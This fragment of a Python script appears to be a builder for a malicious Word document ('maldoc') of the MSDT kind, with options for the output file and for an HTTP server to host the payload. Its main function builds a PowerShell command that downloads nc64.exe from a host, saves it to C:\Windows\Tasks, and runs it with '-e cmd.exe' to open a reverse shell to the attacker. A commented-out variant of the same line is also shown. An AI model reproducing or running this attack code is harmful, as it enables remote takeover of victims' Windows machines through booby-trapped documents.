...
parser.add_argument(
    ...
    "-o",
    default="./msdt.doc",
    help="output maldoc file (default: ./msdt.doc)",
)
...
parser.add_argument(
    ...
    "-i",
    default="wlan0",
    help="network interface or IP address to host the HTTP server (default: wlan0)",
)
...
def main(args):
    ...
    if args.reverse:
#        command = f"""Invoke-WebRequest http://192.168.1.221:81/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
       command = f"""Invoke-WebRequest http://192.168.10.1/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
